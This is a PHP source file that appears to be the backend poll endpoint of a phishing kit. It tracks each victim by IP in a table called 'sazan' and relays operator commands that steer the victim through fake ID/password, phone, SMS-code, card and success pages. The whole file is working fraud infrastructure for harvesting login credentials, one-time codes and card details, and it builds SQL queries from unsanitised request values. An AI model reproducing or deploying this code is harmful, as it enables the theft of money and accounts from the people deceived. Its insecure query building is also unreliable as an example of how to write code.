<?php 
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header('Access-Control-Allow-Headers: Content-Type');
include 'connect.php';
header('Content-Type: application/json; charset=utf-8');
$ip= GetIPz();
$slide = $_POST['x'];
$sayfa = $slide;
$sms = $db->query("SELECT * FROM sms", PDO::FETCH_ASSOC);
foreach($sms as $row1){
    if($row1['sms'] == $ip){ 
        echo 'sms';
        $db->query("DELETE FROM sms WHERE sms='$ip'");
        } 
} 
$tebrik = $db->query("SELECT * FROM tebrik", PDO::FETCH_ASSOC);
foreach($tebrik as $row2){
    if($row2['tebrik'] == $ip){ 
        echo "tebrik";
        $db->query("DELETE FROM tebrik WHERE tebrik='$ip'");
        } 
}   
$hata = $db->query("SELECT * FROM hata", PDO::FETCH_ASSOC);
foreach($hata as $row4){
    if($row4['hata'] == $ip){ 
        echo "hata";
        $db->query("DELETE FROM hata WHERE hata='$ip'");
        } 
}
$sms2 = $db->query("SELECT * FROM sms2", PDO::FETCH_ASSOC);
foreach($sms2 as $row5){
    if($row5['sms2'] == $ip){ 
        echo "sms2";
        $db->query("DELETE FROM sms2 WHERE sms2='$ip'");
        } 
}   
$telhata = $db->query("SELECT * FROM telhata", PDO::FETCH_ASSOC);
foreach($telhata as $row7){
    if($row7['telhata'] == $ip){ 
        echo "telhata";
        	$db->query("DELETE FROM telhata WHERE telhata='$ip'");
        } 
} 
$kart = $db->query("SELECT * FROM kart", PDO::FETCH_ASSOC);
foreach($kart as $row8){
    if($row8['kart'] == $ip){ 
        echo "kart";
        	$db->query("DELETE FROM kart WHERE kart='$ip'");
        } 
}   
$back = $db->query("SELECT * FROM back", PDO::FETCH_ASSOC);
foreach($back as $row6){
    if($row6['back'] == $ip){ 
        echo "back";
			$db->query("UPDATE sazan SET back = '0' WHERE ip = '{$ip}'");
			$db->query("DELETE FROM back WHERE back='$ip'");
        } 
}   
$goControl = $db->query("SELECT * FROM sazan WHERE ip='$ip'")->fetch(PDO::FETCH_ASSOC);
if($goControl['go']=='1'){
    echo '1';
    $db->query("UPDATE sazan SET go = '0' WHERE ip = '$ip'");
}elseif($goControl['go']=='2'){
       echo '2';
    $db->query("UPDATE sazan SET go = '0' WHERE ip = '$ip'");
}elseif($goControl['go']=='3'){
       echo '3';
    $db->query("UPDATE sazan SET go = '0' WHERE ip = '$ip'");
}elseif($goControl['go']=='4'){
       echo '4';
    $db->query("UPDATE sazan SET go = '0' WHERE ip = '$ip'");
}elseif($goControl['go']=='5'){
       echo '5';
    $db->query("UPDATE sazan SET go = '0' WHERE ip = '$ip'");
}else{
    
}
if ($ip) {
    $timex = time() + 7;
    $db->query("UPDATE sazan SET lastOnline = '$timex', now = '$sayfa' WHERE ip = '$ip'");

    
    $slide = $_POST['x'] ?? '';

    // Gelen slide değerine göre now sütununu güncelle
    if ($slide == 'phone.php') {
        $nowValue = 'tel no';
    } elseif ($slide == 'index2.php') {
        $nowValue = 'id pass ekrani';
    } elseif ($slide == 'phone.php?err') {
        $nowValue = 'hatali tel';
    }elseif ($slide == '') {
        $nowValue = 'id pass ekrani';
    } elseif ($slide == 'gray5') {
        $nowValue = 'basarili sayfa';
    }elseif ($slide == 'bekle.php') {
        $nowValue = 'bekleme sayfa';
    }elseif ($slide == 'sms.php') {
        $nowValue = 'sms sayfa';
    }elseif ($slide == 'sms') {
        $nowValue = 'sms sayfa';
    }elseif ($slide == 'hatali.php') {
        $nowValue = 'hatali sms';
    }elseif ($slide == 'bildirim.php') {
        $nowValue = 'bildirim sayfa';
    }elseif ($slide == 'basarili.php') {
        $nowValue = 'basarili sayfa';
    }

    // Now sütununu güncelle
    if (isset($nowValue)) {
        $db->query("UPDATE sazan SET now = '$nowValue' WHERE ip = '$ip'");
    }

    $query = $db->query("SELECT * FROM ips WHERE ipAddress = '$ip'")->fetch(PDO::FETCH_ASSOC);
    if ($query) {
        $db->query("UPDATE ips SET lastOnline = '$timex' WHERE ipAddress = '$ip'");
    } else {
        $query = $db->prepare("INSERT INTO ips SET ipAddress = ?, lastOnline = ?");
        $insert = $query->execute(array($ip, $timex));
    }
}
?>